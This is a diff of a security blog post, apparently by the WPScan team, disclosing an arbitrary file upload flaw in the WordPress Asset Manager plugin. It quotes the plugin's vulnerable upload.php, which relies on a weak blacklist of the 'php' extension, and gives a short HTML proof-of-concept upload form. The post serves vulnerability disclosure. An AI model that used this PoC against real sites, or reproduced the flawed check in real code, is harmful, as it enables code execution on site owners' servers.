@@ -49,10 +49,11 @@
 
 <p>I saw the file yesterday, had a quick skim over it, but didn't think too much of it. That is until WPScan team member <a href="https://www.twitter.com/@gbrindisi" target="_blank">@gbrindisi</a> pointed out that it contained 2 WordPress plugin vulnerabilities.</p>
 
-<p>[code]<br />
-WordPress plugin Asset manager upload.php Arbitrary Code Execution,25.0000,2012-06-27 12:37:03,&quot;491&quot;,Sooraj<br />
-WordPress plugin WP-Property uploadify.php Arbitrary Code Execution,25.0000,2012-06-27 12:44:25,&quot;491&quot;,Sooraj<br />
-[/code]</p>
+<p>
+  
+<div class="highlight"><pre><code class="language-text" data-lang="text">WordPress plugin Asset manager upload.php Arbitrary Code Execution,25.0000,2012-06-27 12:37:03,&quot;491&quot;,Sooraj
+WordPress plugin WP-Property uploadify.php Arbitrary Code Execution,25.0000,2012-06-27 12:44:25,&quot;491&quot;,Sooraj</code></pre></div>
+</p>
 
 <p>The vulnerability details and exploits are likely in the hands of the Inj3ct0r Team and god knows who else. We found the latest 'asset-manager' plugin (version 0.3) to be vulnerable and created a simple PoC. The 'wp-property' plugin did not contain the 'uploadify.php' file which is stated to be vulnerable, did they buy/sell vulnerabilities that hadn't been verified? The 'asset-manager' plugin is not as popular as the 'wp-property' plugin and has only been downloaded <a href="http://wordpress.org/extend/plugins/asset-manager/stats/" target="_blank">~700</a> times.</p>
 
@@ -60,31 +61,32 @@ WordPress plugin WP-Property uploadify.php Arbitrary Code Execution,25.0000,2012
 
 <p><a id="more"></a><a id="more-16915"></a></p>
 
-<p>[code]<br />
-&lt;?php<br />
-/**<br />
- * Upload file to temp directory and return image information in JSON format.<br />
- */<br />
-require('../../../wp-load.php');<br />
-require('paam-config-ajax.php');</p>
+<p>
+  
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * Upload file to temp directory and return image information in JSON format.</span>
+<span class="sd"> */</span>
+<span class="k">require</span><span class="p">(</span><span class="s1">&#39;../../../wp-load.php&#39;</span><span class="p">);</span>
+<span class="k">require</span><span class="p">(</span><span class="s1">&#39;paam-config-ajax.php&#39;</span><span class="p">);</span>
 
-<p>if (!current_user_can('edit_pages')) die(&quot;No permission.&quot;);</p>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">current_user_can</span><span class="p">(</span><span class="s1">&#39;edit_pages&#39;</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;No permission.&quot;</span><span class="p">);</span>
 
-<p>if (isset($_FILES['Filedata'])) {<br />
-    $file_name = $_FILES['Filedata']['name'];</p>
-
-<p> $extension = substr(strrchr($file_name, '.'), 1);</p>
-
-<p> if ($extension == 'php') die(&quot;Invalid file extension.&quot;);</p>
-
-<p> //$unique_name = str_replace('-', '', uniqid()) . '.' . $extension;<br />
-    // not using unique names<br />
-    $unique_name = $file_name;<br />
-    move_uploaded_file($_FILES['Filedata']['tmp_name'], PAAM_TEMPPATH . $unique_name);</p>
-
-<p> echo '{result: 1, name: &quot;' . $unique_name . '&quot;, path: &quot;' . PAAM_TEMPURL . '/' . $unique_name . '&quot;}';<br />
-}<br />
-[/code]</p>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;Filedata&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;Filedata&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+  
+  <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$extension</span> <span class="o">==</span> <span class="s1">&#39;php&#39;</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid file extension.&quot;</span><span class="p">);</span>
+    
+  <span class="c1">//$unique_name = str_replace(&#39;-&#39;, &#39;&#39;, uniqid()) . &#39;.&#39; . $extension;</span>
+  <span class="c1">// not using unique names</span>
+  <span class="nv">$unique_name</span> <span class="o">=</span> <span class="nv">$file_name</span><span class="p">;</span>
+  <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;Filedata&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">PAAM_TEMPPATH</span> <span class="o">.</span> <span class="nv">$unique_name</span><span class="p">);</span>
+  
+  <span class="k">echo</span> <span class="s1">&#39;{result: 1, name: &quot;&#39;</span> <span class="o">.</span> <span class="nv">$unique_name</span> <span class="o">.</span> <span class="s1">&#39;&quot;, path: &quot;&#39;</span> <span class="o">.</span> <span class="nx">PAAM_TEMPURL</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$unique_name</span> <span class="o">.</span> <span class="s1">&#39;&quot;}&#39;</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+</p>
 
 <p>The most important lines in this file are lines 8 and 15. Line 8 ensures that the file is only accesible to users with the 'edit_pages' permission. Line 15 checks that the file extension is not 'php', if it is, throw an error. (line 22 is likely to be vulnerable to XSS but this was not verified)</p>
 
@@ -92,21 +94,21 @@ require('paam-config-ajax.php');</p>
 
 <p>Here is a basic PoC:</p>
 
-<p>[code]<br />
-&lt;html&gt;<br />
-&lt;head&gt;&lt;/head&gt;<br />
-&lt;body&gt;</p>
+<p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
 
-<p>&lt;form action=&quot;http://example.com/wp-content/plugins/asset-manager/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</p>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://example.com/wp-content/plugins/asset-manager/upload.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">enctype=</span><span class="s">&quot;multipart/form-data&quot;</span><span class="nt">&gt;</span>
 
-<p>  &lt;input type=&quot;file&quot; id=&quot;Filedata&quot; name=&quot;Filedata&quot; /&gt;<br />
-  &lt;input type=&quot;submit&quot; id=&quot;submit&quot; /&gt;</p>
+  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;file&quot;</span> <span class="na">id=</span><span class="s">&quot;Filedata&quot;</span> <span class="na">name=</span><span class="s">&quot;Filedata&quot;</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">id=</span><span class="s">&quot;submit&quot;</span> <span class="nt">/&gt;</span>
 
-<p>&lt;/form&gt;</p>
+<span class="nt">&lt;/form&gt;</span>
 
-<p>&lt;/body&gt;<br />
-&lt;/html&gt;<br />
-[/code]</p>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
+</p>
 
 <p>With some JavaScript trickery, the submission of the form and file can be automated. The file will be uploaded to the '/wp-content/uploads/assets/temp/' directory.</p>
 
